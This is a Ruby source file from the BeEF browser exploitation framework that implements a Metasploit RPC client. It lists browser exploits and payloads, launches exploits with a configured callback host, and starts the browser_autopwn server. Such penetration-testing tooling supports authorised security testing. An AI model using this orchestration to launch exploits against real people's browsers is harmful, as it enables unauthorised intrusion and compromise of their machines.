#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
module Extension
module Metasploit
  
	class RpcClient < ::Msf::RPC::Client
		
		include Singleton

        def initialize
			@config = BeEF::Core::Configuration.instance.get('beef.extension.metasploit')

            if not (@config.key?('host') or @config.key?('uri') or @config.key?('port') or @config.key?('user') or @config.key?('pass'))
				print_error 'There is not enough information to initalize Metasploit connectivity at this time'
				print_error 'Please check your options in config.yaml to verify that all information is present'
                BeEF::Core::Configuration.instance.set('beef.extension.metasploit.enabled', false)
                BeEF::Core::Configuration.instance.set('beef.extension.metasploit.loaded', false)
                return nil
            end
		  
            		@lock = false
			@lastauth = nil
			@unit_test = false
			opts = {
				 :host => @config['host'] || '127.0.0.1',
				 :port => @config['port'] || 55552,
				 :uri => @config['uri'] || '/api/',
				 :ssl => @config['ssl'] ,
				 :ssl_version => @config['ssl_version'] ,
				 :context => {}
 			}
			super(opts)
	    end
    
        def get_lock()
            sleep 0.2 while @lock 
            @lock = true
        end
    
        def release_lock()
            @lock = false
        end
	def call(meth, *args)
		ret = nil
		begin
			ret = super(meth,*args)
		rescue Exception => e
			return nil
		end
		ret
	end
    
	def unit_test_init
		@unit_test = true
	end
        # login into metasploit
		def login
            		get_lock()
			res = super(@config['user'] , @config['pass'])
			
		 	if not res
                		release_lock()
                		print_error 'Could not authenticate to Metasploit xmlrpc.'
				return false
			end
			
			print_info 'Successful connection with Metasploit.' if (!@lastauth && !@unit_test)
			
			@lastauth = Time.now
      
            		release_lock()
			true
		end
    
		def browser_exploits()
                
      			get_lock()
			res = self.call('module.exploits')
			return [] if not res or not res['modules']

			mods = res['modules']
			ret = []
			
			mods.each do |m|
				ret << m if(m.include? '/browser/')
			end
			
      			release_lock()
			ret.sort
	  end

		def get_exploit_info(name)
      			get_lock()
			res = self.call('module.info','exploit',name)
      			release_lock()
			res || {}
		end
		
		def get_payloads(name)
      			get_lock()
			res = self.call('module.compatible_payloads',name)
      			release_lock()
			res || {}
		end
		
		def get_options(name)
      			get_lock()
			res = self.call('module.options','exploit',name)
      			release_lock()
			res || {}
		end
		
		def payloads()
      			get_lock()
			res = self.call('module.payloads')
      			release_lock()
			return {} if not res or not res['modules']
			res['modules']
		end
		
		def payload_options(name)
      			get_lock()
			res = self.call('module.options','payload',name)
      			release_lock
			return {} if not res
			res
		end
		
		def launch_exploit(exploit,opts)
      			get_lock()
			begin
				res = self.call('module.execute','exploit',exploit,opts)
			rescue Exception => e
				print_error "Exploit failed for #{exploit} \n"
        			release_lock()
				return false
			end
      
      			release_lock()

			uri = ""
			if opts['SSL'] 
				uri += "https://"
			else
				uri += "http://"
			end

			uri += @config['callback_host'] + ":#{opts['SRVPORT']}/" + opts['URIPATH']

			res['uri'] = uri
			res
		end

		def launch_autopwn
			opts = {
				'LHOST' => @config['callback_host'] ,
				'URIPATH' => @apurl
				}
      			get_lock()
			begin
				res = self.call('module.execute','auxiliary','server/browser_autopwn',opts)
			rescue Exception => e
				print_error "Failed to launch autopwn\n"
        			release_lock()
				return false
			end
      			release_lock()
			return res

		end
		
	end
	
end
end
end
